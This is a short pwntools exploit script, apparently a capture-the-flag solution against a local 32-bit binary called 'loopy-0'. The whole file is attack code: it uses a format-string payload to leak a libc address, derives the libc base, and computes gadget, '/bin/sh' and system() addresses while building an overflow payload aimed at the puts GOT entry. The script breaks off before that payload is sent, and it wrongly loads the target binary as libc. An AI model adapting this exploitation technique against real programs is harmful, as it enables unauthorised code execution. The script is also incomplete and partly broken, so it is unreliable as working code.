from pwn import *
context.arch = 'i386'

# RELRO (GOT) NO CANARY (BOF) NO PIE (GOT & BOF)

offset = 0x48
libc_start_main_offset = 0x00021560
libc_offset = 13

p = process('./loopy-0')

printf_payload = b'%62$p\0' # libc_start_main or %61$p
payload = printf_payload + cyclic(offset - len(printf_payload)) + cyclic(0x4) + p32(p.elf.got['puts'])

p.recv()

p.sendline(printf_payload)

p.recvuntil(b'd: ')

leak = int(p.recv().decode('utf-8').strip(), 16)
leak_m = leak - libc_offset
glibc_base = leak_m - libc_start_main_offset

libc = ELF(p.elf.path)
libc.address = glibc_base

push_eax = 0x00036a7d + libc.address
bin_sh = 0x001bd0d5 + libc.address
system = 0x00048170 + libc.address



